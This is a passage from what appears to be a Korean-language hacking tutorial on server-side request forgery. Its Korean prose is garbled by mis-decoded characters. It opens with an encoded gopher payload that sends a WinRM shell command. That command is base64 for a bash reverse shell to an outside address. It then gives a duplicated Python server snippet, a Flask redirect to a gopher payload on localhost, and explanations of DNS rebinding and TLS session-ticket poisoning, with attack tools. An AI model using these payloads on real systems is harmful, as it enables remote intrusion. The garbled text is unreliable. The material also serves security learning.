20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%20%4e%61%6d%65%3d%22%5f%5f%63%69%6d%6e%61%6d%65%73%70%61%63%65%22%3e%72%6f%6f%74%2f%73%63%78%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%3e%0a%20%20%20%20%20%20%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%3c%2f%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%3c%73%3a%42%6f%64%79%3e%0a%20%20%20%20%20%20%3c%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%22%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%63%6f%6d%6d%61%6e%64%3e%65%63%68%6f%20%2d%6e%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%78%4d%53%38%35%4d%44%41%78%49%44%41%2b%4a%6a%45%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%3c%2f%70%3a%63%6f%6d%6d%61%6e%64%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%74%69%6d%65%6f%75%74%3e%30%3c%2f%70%3a%74%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%2f%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%3e%0a%20%20%20%3c%2f%73%3a%42%6f%64%79%3e%0a%3c%2f%73%3a%45%6e%76%65%6c%6f%70%65%3e%0a")
```python
self.end_headers()

httpd = HTTPServer(('0.0.0.0', 443), MainHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="server.pem", server_side=True)
httpd.serve_forever()
```
```python
self.end_headers()

httpd = HTTPServer(('0.0.0.0', 443), MainHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="server.pem", server_side=True)
httpd.serve_forever()
```

```python
from flask import Flask, redirect
from urllib.parse import quote
app = Flask(__name__)

@app.route('/')
def root():
return redirect('gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20', code=301)

if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
```
<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)ì„ ì‚¬ìš©í•˜ì—¬ ì„¸ê³„ì—ì„œ ê°€ì¥ **ê³ ê¸‰** ì»¤ë®¤ë‹ˆí‹° ë„êµ¬ë¡œ êµ¬ë™ë˜ëŠ” **ì›Œí¬í”Œë¡œìš°ë¥¼ ì‰½ê²Œ êµ¬ì¶•**í•˜ê³  **ìë™í™”**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ì˜¤ëŠ˜ ì•¡ì„¸ìŠ¤í•˜ì„¸ìš”:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## DNS Rebidding CORS/SOP ìš°íšŒ

**CORS/SOP**ë¡œ ì¸í•´ **ë¡œì»¬ IPì—ì„œ ì½˜í…ì¸ ë¥¼ ìœ ì¶œ**í•˜ëŠ” ë° **ë¬¸ì œ**ê°€ ë°œìƒí•˜ëŠ” ê²½ìš°, **DNS Rebidding**ì„ ì‚¬ìš©í•˜ì—¬ ì´ ì œí•œì„ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="../cors-bypass.md" %}
[cors-bypass.md](../cors-bypass.md)
{% endcontent-ref %}

### ìë™í™”ëœ DNS Rebidding

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity)ì€ [DNS rebinding](https://en.wikipedia.org/wiki/DNS\_rebinding) ê³µê²©ì„ ìˆ˜í–‰í•˜ê¸° ìœ„í•œ ë„êµ¬ì…ë‹ˆë‹¤. ì´ ë„êµ¬ì—ëŠ” ê³µê²© ì„œë²„ DNS ì´ë¦„ì˜ IP ì£¼ì†Œë¥¼ ëŒ€ìƒ ê¸°ê³„ì˜ IP ì£¼ì†Œë¡œ ë‹¤ì‹œ ë°”ì¸ë”©í•˜ê³  ëŒ€ìƒ ê¸°ê³„ì˜ ì·¨ì•½í•œ ì†Œí”„íŠ¸ì›¨ì–´ë¥¼ ê³µê²©í•˜ê¸° ìœ„í•œ ê³µê²© í˜ì´ë¡œë“œë¥¼ ì œê³µí•˜ëŠ” í•„ìš”í•œ êµ¬ì„± ìš”ì†Œê°€ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤.

[**http://rebind.it/singularity.html**](http://rebind.it/singularity.html)ì—ì„œ **ê³µê°œì ìœ¼ë¡œ ì‹¤í–‰ ì¤‘ì¸ ì„œë²„**ë„ í™•ì¸í•´ë³´ì„¸ìš”.

## DNS Rebidding + TLS ì„¸ì…˜ ID/ì„¸ì…˜ í‹°ì¼“

ìš”êµ¬ ì‚¬í•­:

* **SSRF**
* **ì™¸ë¶€ TLS ì„¸ì…˜**
* **ë¡œì»¬ í¬íŠ¸ì— ìˆëŠ” ê²ƒë“¤**

ê³µê²©:

1. ì‚¬ìš©ì/ë´‡ì—ê²Œ **ê³µê²©ìê°€ ì œì–´í•˜ëŠ” ë„ë©”ì¸**ì— **ì•¡ì„¸ìŠ¤**í•˜ë„ë¡ ìš”ì²­í•©ë‹ˆë‹¤.
2. **DNS**ì˜ **TTL**ì€ **0**ì´ˆì…ë‹ˆë‹¤(ë”°ë¼ì„œ í”¼í•´ìëŠ” ê³§ ë„ë©”ì¸ì˜ IPë¥¼ ë‹¤ì‹œ í™•ì¸í•  ê²ƒì…ë‹ˆë‹¤).
3. í”¼í•´ìì™€ ê³µê²©ìì˜ ë„ë©”ì¸ ê°„ì— **TLS ì—°ê²°**ì´ ìƒì„±ë©ë‹ˆë‹¤. ê³µê²©ìëŠ” **ì„¸ì…˜ ID ë˜ëŠ” ì„¸ì…˜ í‹°ì¼“** ë‚´ì— **í˜ì´ë¡œë“œë¥¼ ì‚½ì…**í•©ë‹ˆë‹¤.
4. **ë„ë©”ì¸**ì€ **ìê¸° ìì‹ **ì— ëŒ€í•œ **ë¬´í•œí•œ ë¦¬ë””ë ‰ì…˜ ë£¨í”„**ë¥¼ ì‹œì‘í•©ë‹ˆë‹¤. ì´ëŠ” ì‚¬ìš©ì/ë´‡ì´ ë„ë©”ì¸ì— ê³„ì† ì•¡ì„¸ìŠ¤í•˜ë„ë¡ ë§Œë“¤ê¸° ìœ„í•œ ê²ƒì…ë‹ˆë‹¤. ì´ ê³¼ì •ì—ì„œ ì‚¬ìš©ì/ë´‡ì€ ë„ë©”ì¸ì˜ **DNS ìš”ì²­**ì„ ë‹¤ì‹œ ìˆ˜í–‰í•©ë‹ˆë‹¤.
5. DNS ìš”ì²­ì—ì„œëŠ” **ì´ì œ** **ê°œì¸ IP** ì£¼ì†Œê°€ ì œê³µë©ë‹ˆë‹¤(ì˜ˆ: 127.0.0.1).
6. ì‚¬ìš©ì/ë´‡ì€ **TLS ì—°ê²°ì„ ë‹¤ì‹œ ì„¤ì •**í•˜ë ¤ê³  ì‹œë„í•˜ê³ , ì´ë¥¼ ìœ„í•´ **ì„¸ì…˜ ID/í‹°ì¼“ ID**ë¥¼ **ì „ì†¡**í•©ë‹ˆë‹¤(ì—¬ê¸°ì—ëŠ” ê³µê²©ìì˜ **í˜ì´ë¡œë“œ**ê°€ í¬í•¨ë˜ì–´ ìˆì—ˆìŠµë‹ˆë‹¤). ì¶•í•˜í•©ë‹ˆë‹¤. ì‚¬ìš©ì/ë´‡ì—ê²Œ **ìê¸° ìì‹ ì„ ê³µê²©í•˜ë„ë¡ ìš”ì²­**í–ˆìŠµë‹ˆë‹¤.

ì´ ê³µê²© ì¤‘ì— localhost:11211 (_memcache_)ë¥¼ ê³µê²©í•˜ë ¤ë©´ í”¼í•´ìê°€ www.attacker.com:11211(í¬íŠ¸ëŠ” í•­ìƒ ë™ì¼í•´ì•¼ í•¨)ì™€ ì´ˆê¸° ì—°ê²°ì„ ìˆ˜ë¦½í•˜ë„ë¡ í•´ì•¼ í•©ë‹ˆë‹¤.\
ì´ ê³µê²©ì„ ìˆ˜í–‰í•˜ê¸° ìœ„í•´ ë‹¤ìŒ ë„êµ¬ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: [https://github.com/jmdx/TLS-poison/](https://github.com/jmdx/TLS-poison/)\
ì´ ê³µê²©ì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” ë‹¤ìŒì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: [https://www.youtube.com/watch?v=qGpAJxfADjo\&ab\_channel=DEFCONConference](https://www.youtube.com/watch?v=qGpAJxfADjo\&ab\_channel=DEFCONConference)

## Blind SSRF

ë¸”ë¼ì¸ë“œ SSRFì™€ ë¹„ë¸”ë¼ì¸ë“œ SSRFì˜ ì°¨ì´ì ì€ ë¸”ë¼ì¸ë“œì—ì„œëŠ” SSRF ìš”ì²­ì˜ ì‘ë‹µì„ ë³¼ ìˆ˜ ì—†ë‹¤ëŠ” ê²ƒì…ë‹ˆë‹¤. ë”°ë¼ì„œ ì˜ ì•Œë ¤ì§„ ì·¨ì•½ì ë§Œì„ ê³µê²©í•  ìˆ˜ ìˆì–´ ë” ì–´ë µê²Œ ì´ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ì‹œê°„ ê¸°ë°˜ SSRF

ì„œë²„ì˜ ì‘ë‹µ ì‹œê°„ì„ í™•ì¸í•˜ì—¬ **ë¦¬ì†ŒìŠ¤ê°€ ì¡´ì¬í•˜ëŠ”ì§€ ì—¬ë¶€ë¥¼ ì•Œ ìˆ˜** ìˆì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤(ì¡´ì¬í•˜ëŠ” ë¦¬ì†ŒìŠ¤ì— ì•¡ì„¸ìŠ¤í•˜ëŠ” ë° ë” ë§ì€ ì‹œê°„ì´ ì†Œìš”ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤).

## Cloud SSRF Exploitation

í´ë¼ìš°ë“œ í™˜ê²½ì—ì„œ ì‹¤í–‰ ì¤‘ì¸ ê¸°ê³„ì—ì„œ SSRF ì·¨ì•½ì ì„ ë°œê²¬í•˜ë©´ í´ë¼ìš°ë“œ í™˜ê²½ì— ëŒ€í•œ í¥ë¯¸ë¡œìš´ ì •ë³´ì™€ ìê²© ì¦ëª…ì„ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="cloud-ssrf.md" %}
[cloud-ssrf.md](cloud-ssrf.md)
{% endcontent-ref %}

## SSRF ì·¨ì•½í•œ í”Œë«í¼

ì—¬ëŸ¬ ì•Œë ¤ì§„ í”Œë«í¼ì—ëŠ” SSRF ì·¨ì•½ì ì´ í¬í•¨ë˜ì–´ ìˆê±°ë‚˜ í¬í•¨ë˜ì–´ ìˆì—ˆë˜ ê²½ìš°ê°€ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ í™•ì¸í•˜ë ¤ë©´ ë‹¤ìŒì„ ì°¸ì¡°í•˜ì„¸ìš”:

{% content-ref url="ssrf-vulnerable-platforms.md" %}
[ssrf-vulnerable-platforms.md](ssrf-vulnerable-platforms.md)
{% endcontent-ref %}

## ë„êµ¬

### [**SSRFMap**](https://github.com/swisskyrepo/SSRFmap)

SSRF ì·¨ì•½ì ì„ ê°ì§€í•˜ê³  ì´ìš©í•˜ëŠ” ë„êµ¬

### [Gopherus](https://github.com/tarunkant/Gopherus)

* [Gopherusì— ëŒ€í•œ ë¸”ë¡œê·¸ í¬ìŠ¤íŠ¸](https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/)

ì´ ë„êµ¬ëŠ” ë‹¤ìŒì„ ìœ„í•œ Gopher í˜ì´ë¡œë“œë¥¼ ìƒì„±í•©ë‹ˆë‹¤:

* MySQL
* PostgreSQL
* FastCGI
* Redis
* Zabbix
* Memcache

### [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)

* [SSRF ì‚¬ìš©ì— ëŒ€í•œ ë¸”ë¡œê·¸ í¬ìŠ¤íŠ¸](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/)

_remote-method-guesser_ëŠ” ëŒ€ë¶€ë¶„ì˜ ì¼ë°˜ì ì¸ _Java RMI_ ì·¨ì•½ì ì— ëŒ€í•œ ê³µê²© ì‘ì—…ì„ ì§€ì›í•˜ëŠ” _Java RMI_ ì·¨ì•½ì  ìŠ¤ìºë„ˆì…ë‹ˆë‹¤. ì‚¬ìš© ê°€ëŠ¥í•œ ëŒ€ë¶€ë¶„ì˜ ì‘ì—…ì€ ìš”ì²­ëœ ì‘ì—…ì— ëŒ€í•œ _SSRF_ í˜ì´ë¡œë“œë¥¼ ìƒì„±í•˜ê¸° ìœ„í•œ `--ssrf` ì˜µì…˜ì„ ì§€ì›í•©ë‹ˆë‹¤. `--gopher` ì˜µì…˜ê³¼ í•¨ê»˜ ì‚¬ìš©í•˜ë©´ ì¤€ë¹„ëœ _gopher_ í˜ì´ë¡œë“œë¥¼ ì§ì ‘ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### [SSRF Proxy](https://github.com/bcoles/ssrf\_proxy)

SSRFì— ì·¨ì•½í•œ ì„œë²„ë¥¼ í†µí•´ í´ë¼ì´ì–¸íŠ¸ HTTP íŠ¸ë˜í”½ì„ í„°ë„ë§í•˜ëŠ” ë©€í‹° ìŠ¤ë ˆë“œ HTTP í”„ë¡ì‹œ ì„œë²„

### ì—°ìŠµí•˜ê¸°

{% embed url="https://github.com/incredibleindishell/SSRF_Vulnerable_Lab" %}

## ì°¸ê³  ìë£Œ

* [https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a
